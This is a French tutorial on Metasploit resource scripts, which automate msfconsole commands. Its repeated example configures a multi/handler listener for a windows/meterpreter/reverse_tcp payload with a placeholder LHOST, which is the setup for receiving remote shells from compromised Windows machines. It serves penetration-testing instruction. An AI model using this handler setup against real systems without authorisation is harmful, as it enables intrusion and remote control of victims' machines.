# Automating

## Vue d’ensemble

Les **resource scripts** de Metasploit sont une fonctionnalité utile qui permet d’automatiser des tâches et des commandes répétitives dans `msfconsole`. Ils fonctionnent comme des scripts batch, car ils te permettent de définir une suite de commandes et de les exécuter automatiquement dans l’ordre.

C’est particulièrement utile lorsque tu veux répéter la même configuration plusieurs fois, comme démarrer un handler, configurer un payload ou exécuter plusieurs commandes Metasploit sans les retaper à chaque fois.

## Ce que font les resource scripts

Les resource scripts permettent de :

- Automatiser les commandes répétitives de `msfconsole`.
- Exécuter les commandes de manière séquentielle.
- Gagner du temps pendant les tests et l’exploitation.
- Standardiser les tâches courantes.
- Réduire les erreurs manuelles.

Ils sont généralement utilisés pour :

- Configurer un `multi/handler`.
- Charger et exécuter des payloads.
- Configurer automatiquement des options.
- Lancer un flux de travail Metasploit prédéfini.

## Idée de base

Un resource script est simplement un fichier texte qui contient des commandes `msfconsole`. Lorsque le script est chargé, Metasploit exécute chaque commande dans l’ordre.

### Exemple de structure

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4444
run
```

## Comment ça fonctionne

Au lieu de taper les mêmes commandes manuellement, tu les mets dans un fichier puis tu charges ce fichier dans `msfconsole`. Metasploit exécute ensuite les commandes les unes après les autres.

### Exemple de fichier ressource

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4444
run
```

### Charger le script

Dans `msfconsole`, utilise :

```bash
resource script.rc
```

Si le fichier est valide, Metasploit exécute automatiquement toutes les commandes qu’il contient.

## Utilisations courantes

### Configuration d’un multi/handler

Un resource script est utile lorsque tu dois préparer un listener avant de lancer un payload.

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4444
run
```

### Flux de travail répétitifs

Tu peux aussi utiliser les resource scripts pour automatiser d’autres tâches répétitives, comme :

- Sélectionner un workspace.
- Vérifier l’état de la base de données.
- Charger un plugin.
- Exécuter un module.
- Enregistrer la sortie.

## Pourquoi c’est important

Les resource scripts sont précieux parce qu’ils rendent Metasploit plus rapide et plus efficace à utiliser. Ils sont particulièrement utiles lorsque tu dois répéter les mêmes commandes pendant des laboratoires, des démonstrations ou des évaluations réelles.

## Idée clé

Les resource scripts de Metasploit automatisent `msfconsole` en exécutant une liste de commandes dans l’ordre. C’est une méthode simple mais puissante pour gagner du temps et réduire la répétition.
